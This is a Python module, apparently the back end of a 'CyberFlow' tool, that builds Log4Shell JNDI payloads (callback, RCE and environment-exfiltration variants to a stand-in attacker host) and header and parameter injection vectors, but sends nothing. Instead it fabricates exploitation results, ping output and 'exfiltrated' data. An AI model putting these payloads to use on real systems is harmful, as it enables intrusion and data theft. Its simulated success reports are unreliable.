#!/usr/bin/env python3
"""
Log4j Exploit Module for CyberFlow UI
Takes target information and attempts to exploit the Log4Shell vulnerability (CVE-2021-44228).
"""

import sys
import json
import random
import string
import time
from datetime import datetime

# Parse JSON input from Node.js
data_str = sys.argv[1] if len(sys.argv) > 1 else "{}"
data = json.loads(data_str)

# Extract target information
target = data.get("target", "")
callback_url = data.get("callback_url", "")
path = data.get("path", "/")
http_port = data.get("http_port", 8080)
jndi_port = data.get("jndi_port", 1389)
payload_type = data.get("payload_type", "basic")

class Log4jExploit:
    def __init__(self, target, callback_url=None, path="/", http_port=8080, jndi_port=1389, payload_type="basic"):
        self.target = target
        self.path = path
        self.http_port = http_port
        self.jndi_port = jndi_port
        self.payload_type = payload_type
        self.exploit_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        
        # If no callback URL is provided, use a mock one for simulation
        if not callback_url:
            self.callback_url = f"attacker-server-{random.randint(1000, 9999)}.example.com"
        else:
            self.callback_url = callback_url
        
    def generate_payload(self):
        """Generate the Log4j JNDI payload based on payload type"""
        if self.payload_type == "rce":
            # Remote code execution payload
            return f"${{jndi:ldap://{self.callback_url}:{self.jndi_port}/Basic/Command/Base64/cGluZyAtYyAzIGV4YW1wbGUuY29t}}"
        elif self.payload_type == "exfil":
            # Data exfiltration payload
            return f"${{jndi:ldap://{self.callback_url}:{self.jndi_port}/${{env:USER}}.${{hostName}}.{self.exploit_id}}}"
        else:
            # Basic callback payload
            return f"${{jndi:ldap://{self.callback_url}:{self.jndi_port}/{self.exploit_id}}}"
    
    def generate_attack_vectors(self):
        """Generate different HTTP headers to inject with the payload"""
        payload = self.generate_payload()
        
        return {
            "headers": {
                "User-Agent": payload,
                "X-Forwarded-For": payload,
                "Referer": f"https://example.com/?ref={payload}",
                "X-Api-Version": payload,
                "Cookie": f"session={payload}",
                "X-Forwarded-Host": payload
            },
            "params": {
                "search": payload,
                "id": payload,
                "user": payload
            }
        }
    
    def run_exploit(self):
        """
        Simulate running the Log4j exploit
        In a real implementation, this would make HTTP requests with the malicious payloads
        """
        if not self.target:
            return {
                "status": "error",
                "message": "No target specified"
            }
        
        # Generate all attack vectors
        attack_vectors = self.generate_attack_vectors()
        payload = self.generate_payload()
        
        # In a real exploit, we would send multiple requests with different attack vectors
        # and check for callbacks to our LDAP server
        
        # Simulate different payloads and attack paths
        attack_paths = [
            {"url": f"http://{self.target}:{self.http_port}{self.path}", "name": "Main Application Path"},
            {"url": f"http://{self.target}:{self.http_port}/api/login", "name": "API Login Endpoint"},
            {"url": f"http://{self.target}:{self.http_port}/api/data", "name": "API Data Endpoint"}
        ]
        
        # Simulate execution and results
        simulation_results = []
        callback_detected = False
        vulnerable_path = None
        exploitation_details = None
        
        # Target-specific simulation - make simulation more realistic based on target properties
        # For example, simulate successful exploitation if the target is an IP with specific patterns
        target_vulnerable = False
        
        # If target contains numerics, it's likely an IP - use it for simulation consistency
        if self.target and any(c.isdigit() for c in self.target):
            # Use the last octet of an IP-like target to determine vulnerability (for consistent demo results)
            ip_parts = self.target.split('.')
            if len(ip_parts) == 4 and all(p.isdigit() for p in ip_parts):
                last_octet = int(ip_parts[3])
                # For demo, consider targets with even last octet as vulnerable
                target_vulnerable = (last_octet % 2 == 0)
        
        # Simulate testing multiple vectors
        for i, path_info in enumerate(attack_paths):
            path = path_info["url"]
            path_name = path_info["name"]
            
            # Determine simulation outcome based on path and target
            # For consistent demo results with the same inputs
            if i == 0 and target_vulnerable:
                success = True  # First path always vulnerable for specifically marked targets
                vuln_vector = "HTTP_HEADER_USER_AGENT"
                callback_time = datetime.now().isoformat()
                callback_detected = True
                vulnerable_path = path
            elif i == 1 and target_vulnerable and self.payload_type == "rce":
                success = True  # Second path vulnerable for RCE attempts on vulnerable targets
                vuln_vector = "HTTP_HEADER_X_FORWARDED_FOR"
                callback_time = datetime.now().isoformat()
                callback_detected = True
                if not vulnerable_path:
                    vulnerable_path = path
            else:
                # Randomized outcome for other paths
                success = random.random() < 0.1  # 10% chance of success 
                vuln_vector = random.choice(["HTTP_HEADER_COOKIE", "QUERY_PARAM_SEARCH", "HTTP_HEADER_X_API_VERSION"])
                callback_time = datetime.now().isoformat() if success else None
                if success and not callback_detected:
                    callback_detected = True
                    vulnerable_path = path
            
            # Build detailed result
            attack_details = {
                "path": path,
                "path_name": path_name,
                "payload": payload,
                "attack_vector": vuln_vector,
                "status": "vulnerable" if success else "not_vulnerable",
                "timestamp": datetime.now().isoformat()
            }
            
            if success:
                attack_details["callback"] = {
                    "detected": True,
                    "time": callback_time,
                    "data_received": self.payload_type == "exfil"
                }
                
                # Add exploitation outcome for RCE payloads
                if self.payload_type == "rce":
                    attack_details["rce_outcome"] = {
                        "command_executed": "ping -c 3 example.com",
                        "execution_successful": True,
                        "response_time": random.uniform(0.1, 0.5)
                    }
            
            simulation_results.append(attack_details)
        
        # Create exploitation details if vulnerability was found
        if callback_detected:
            exploitation_details = {
                "vulnerable_path": vulnerable_path,
                "callback_received": True,
                "callback_time": datetime.now().isoformat(),
                "successful_vector": next((r["attack_vector"] for r in simulation_results if r["status"] == "vulnerable"), None),
                "possible_rce": self.payload_type == "rce" and any(r.get("rce_outcome", {}).get("execution_successful", False) for r in simulation_results),
                "data_exfiltrated": self.payload_type == "exfil" and callback_detected
            }
            
            if self.payload_type == "rce" and exploitation_details["possible_rce"]:
                exploitation_details["rce_details"] = {
                    "command": "ping -c 3 example.com",
                    "output": "PING example.com (93.184.216.34): 56 data bytes\n64 bytes from 93.184.216.34: icmp_seq=0 ttl=56 time=11.632 ms\n64 bytes from 93.184.216.34: icmp_seq=1 ttl=56 time=28.095 ms\n64 bytes from 93.184.216.34: icmp_seq=2 ttl=56 time=14.412 ms\n\n--- example.com ping statistics ---\n3 packets transmitted, 3 packets received, 0.0% packet loss\nround-trip min/avg/max/stddev = 11.632/18.046/28.095/7.202 ms"
                }
            
            if self.payload_type == "exfil" and exploitation_details["data_exfiltrated"]:
                exploitation_details["exfil_details"] = {
                    "data_type": "Environment Variables",
                    "exfiltrated_data": {
                        "username": "tomcat",
                        "hostname": f"{self.target.replace('.', '-')}-prod-app01"
                    }
                }
            
        # Overall exploitation status
        exploit_status = "success" if callback_detected else "failed"
        
        # Create the response
        result = {
            "status": exploit_status,
            "target": self.target,
            "exploit_type": "Log4Shell (CVE-2021-44228)",
            "exploit_id": self.exploit_id,
            "payload": payload,
            "callback_url": self.callback_url,
            "attack_attempted": True,
            "attack_vectors_tested": len(simulation_results),
            "vulnerable_vectors_found": sum(1 for r in simulation_results if r["status"] == "vulnerable"),
            "simulation_results": simulation_results,
            "exploitation_details": exploitation_details,
            "timestamp": datetime.now().isoformat()
        }
        
        # Add message for user-friendly display
        if callback_detected:
            result["message"] = f"Successfully exploited Log4j vulnerability on {self.target}. JNDI callback received, indicating the target is vulnerable to Log4Shell (CVE-2021-44228)."
            
            if self.payload_type == "rce" and exploitation_details["possible_rce"]:
                result["message"] += " Remote code execution was successful - executed 'ping -c 3 example.com' on the target system."
            elif self.payload_type == "exfil" and exploitation_details["data_exfiltrated"]:
                result["message"] += f" Successfully exfiltrated username and hostname data from target system."
        else:
            result["message"] = f"Failed to exploit Log4j vulnerability on {self.target}. No JNDI callbacks were received, indicating the target might be patched or not using a vulnerable Log4j version."
        
        # Generate HTML report for visual display
        result["html_report"] = self.generate_html_report(result)        
        return result
        
    def generate_html_report(self, result):
        """Generate an HTML report for better UI display"""
        
        # Determine colors based on status
        status_color = "#28a745" if result["status"] == "success" else "#dc3545"
        status_icon = "✓" if result["status"] == "success" else "✗"
        status_text = "SUCCESSFUL" if result["status"] == "success" else "FAILED"
        
        # Start the HTML report
        html = f"""
        <div style="font-family: Arial, sans-serif; max-height: 400px; overflow: auto; padding: 0;">
            <div style="background-color: #f8f9fa; border-left: 4px solid {status_color}; padding: 15px; margin-bottom: 15px;">
                <div style="display: flex; justify-content: space-between; align-items: center;">
                    <h3 style="margin: 0; color: {status_color}; font-size: 18px;">
                        <span style="font-size: 18px; margin-right: 5px;">{status_icon}</span>
                        Log4j Exploitation {status_text}
                    </h3>
                    <div style="background-color: {status_color}; color: white; border-radius: 4px; padding: 3px 10px; font-size: 14px; font-weight: bold;">
                        CVE-2021-44228
                    </div>
                </div>
                <div style="margin-top: 10px; display: flex; flex-wrap: wrap; gap: 15px;">
                    <div style="flex: 1; min-width: 180px;">
                        <div><strong>Target:</strong> {result['target']}:{self.http_port}</div>
                        <div><strong>Payload Type:</strong> {self.payload_type.upper()}</div>
                        <div><strong>Timestamp:</strong> {result['timestamp'].split('T')[0]}</div>
                    </div>
                    <div style="flex: 1; min-width: 180px;">
                        <div><strong>Attack Vectors Tested:</strong> {result['attack_vectors_tested']}</div>
                        <div><strong>Successful Vectors:</strong> {result['vulnerable_vectors_found']}</div>
                        <div><strong>Exploit ID:</strong> {result['exploit_id']}</div>
                    </div>
                </div>
            </div>
        """
        
        # Attack details section
        html += f"""
            <div style="margin-bottom: 15px;">
                <h3 style="margin-top: 0; font-size: 16px; border-bottom: 1px solid #dee2e6; padding-bottom: 8px;">
                    Attack Details
                </h3>
                <div style="background-color: #f8f9fa; border-radius: 4px; padding: 10px; margin-bottom: 10px;">
                    <div style="margin-bottom: 5px;"><strong>JNDI Payload:</strong></div>
                    <code style="display: block; background-color: #212529; color: #fff; padding: 8px; border-radius: 4px; overflow-x: auto; font-size: 13px;">{result['payload']}</code>
                </div>
        """
        
        # Add exploitation details if successful
        if result["status"] == "success" and result.get("exploitation_details"):
            exploit_details = result["exploitation_details"]
            
            html += f"""
                <div style="border: 1px solid #28a745; border-radius: 4px; margin-bottom: 10px; overflow: hidden;">
                    <div style="background-color: #28a745; color: white; padding: 8px 12px; font-weight: bold;">
                        Successful Exploitation
                    </div>
                    <div style="padding: 12px;">
                        <div><strong>Vulnerable Path:</strong> {exploit_details['vulnerable_path']}</div>
                        <div><strong>Attack Vector:</strong> {exploit_details['successful_vector']}</div>
                        <div><strong>Callback Received:</strong> Yes</div>
            """
            
            # Add RCE details if applicable
            if exploit_details.get("possible_rce") and exploit_details.get("rce_details"):
                rce_details = exploit_details["rce_details"]
                html += f"""
                        <div style="margin-top: 10px; margin-bottom: 10px;">
                            <div style="background-color: #ffc107; color: #212529; display: inline-block; padding: 3px 8px; border-radius: 4px; font-weight: bold; margin-bottom: 5px;">Remote Code Execution</div>
                            <div><strong>Command Executed:</strong> {rce_details['command']}</div>
                            <div><strong>Command Output:</strong></div>
                            <pre style="background-color: #212529; color: #fff; padding: 8px; border-radius: 4px; max-height: 150px; overflow: auto; margin-top: 5px; font-size: 13px;">{rce_details['output']}</pre>
                        </div>
                """
            
            # Add exfiltration details if applicable
            if exploit_details.get("data_exfiltrated") and exploit_details.get("exfil_details"):
                exfil_details = exploit_details["exfil_details"]
                html += f"""
                        <div style="margin-top: 10px;">
                            <div style="background-color: #17a2b8; color: white; display: inline-block; padding: 3px 8px; border-radius: 4px; font-weight: bold; margin-bottom: 5px;">Data Exfiltration</div>
                            <div><strong>Data Type:</strong> {exfil_details['data_type']}</div>
                            <div><strong>Exfiltrated Data:</strong></div>
                            <table style="width: 100%; border-collapse: collapse; margin-top: 5px;">
                                <tr style="background-color: #e9ecef;">
                                    <th style="padding: 6px; text-align: left; border: 1px solid #dee2e6;">Property</th>
                                    <th style="padding: 6px; text-align: left; border: 1px solid #dee2e6;">Value</th>
                                </tr>
                """
                
                # Add each data item
                for key, value in exfil_details["exfiltrated_data"].items():
                    html += f"""
                                <tr>
                                    <td style="padding: 6px; border: 1px solid #dee2e6;">{key}</td>
                                    <td style="padding: 6px; border: 1px solid #dee2e6;">{value}</td>
                                </tr>
                    """
                
                html += """
                            </table>
                        </div>
                """
            
            html += """
                    </div>
                </div>
            """
        
        # Add attack attempts table
        html += """
                <div>
                    <h4 style="margin-top: 0; margin-bottom: 8px; font-size: 14px;">Attack Attempts</h4>
                    <table style="width: 100%; border-collapse: collapse; font-size: 13px;">
                        <tr style="background-color: #e9ecef;">
                            <th style="padding: 6px; text-align: left; border: 1px solid #dee2e6;">Path</th>
                            <th style="padding: 6px; text-align: left; border: 1px solid #dee2e6;">Attack Vector</th>
                            <th style="padding: 6px; text-align: center; border: 1px solid #dee2e6;">Status</th>
                        </tr>
        """
        
        # Add rows for each attack attempt
        for attempt in result["simulation_results"]:
            status_cell_color = "#28a745" if attempt["status"] == "vulnerable" else "#dc3545"
            status_cell_text = "Vulnerable" if attempt["status"] == "vulnerable" else "Not Vulnerable"
            
            html += f"""
                        <tr>
                            <td style="padding: 6px; border: 1px solid #dee2e6;">{attempt['path_name']}</td>
                            <td style="padding: 6px; border: 1px solid #dee2e6;">{attempt['attack_vector']}</td>
                            <td style="padding: 6px; text-align: center; border: 1px solid #dee2e6; color: white; background-color: {status_cell_color};">{status_cell_text}</td>
                        </tr>
            """
        
        html += """
                    </table>
                </div>
            </div>
        """
        
        # Add remediation advice section
        html += f"""
            <div style="background-color: #f8f9fa; border-left: 4px solid #6c757d; padding: 15px;">
                <h3 style="margin-top: 0; color: #6c757d; font-size: 16px;">Remediation Advice</h3>
                <ul style="margin: 0; padding-left: 20px;">
                    <li style="margin-bottom: 5px;">Update Apache Log4j to version 2.15.0 or later</li>
                    <li style="margin-bottom: 5px;">Set system property 'log4j2.formatMsgNoLookups=true'</li>
                    <li style="margin-bottom: 5px;">Implement WAF rules to block JNDI lookup patterns</li>
                    <li style="margin-bottom: 0;">Apply vendor-specific patches for affected applications</li>
                </ul>
            </div>
        </div>
        """
        
        return html

# Main execution
try:
    if not target:
        result = {
            "status": "error",
            "message": "No target specified",
            "timestamp": datetime.now().isoformat()
        }
    else:
        exploit = Log4jExploit(
            target=target,
            callback_url=callback_url,
            path=path,
            http_port=http_port,
            jndi_port=jndi_port,
            payload_type=payload_type
        )
        exploit_result = exploit.run_exploit()
        
        # Add timestamp to the result if not already present
        if "timestamp" not in exploit_result:
            exploit_result["timestamp"] = datetime.now().isoformat()
        
        result = exploit_result

    # Output results as JSON
    print(json.dumps({"message": result}))

except Exception as e:
    error_output = {
        "status": "error",
        "message": f"Error during Log4j exploit: {str(e)}",
        "timestamp": datetime.now().isoformat()
    }
    print(json.dumps({"message": error_output}))